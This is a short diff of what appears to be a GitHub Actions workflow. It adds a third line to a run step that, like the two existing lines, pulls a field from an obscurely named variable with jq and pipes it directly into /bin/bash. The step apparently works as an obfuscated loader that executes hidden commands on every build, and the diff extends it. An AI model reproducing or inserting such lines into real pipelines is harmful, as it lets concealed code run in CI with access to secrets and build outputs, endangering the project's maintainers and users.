@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$gay2" | jq -r .nnlv1005 | /bin/bash
           echo $sfova4 | jq -r .urjm0328 | /bin/bash
+          printf '%s' "$op22" | jq -r .u6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
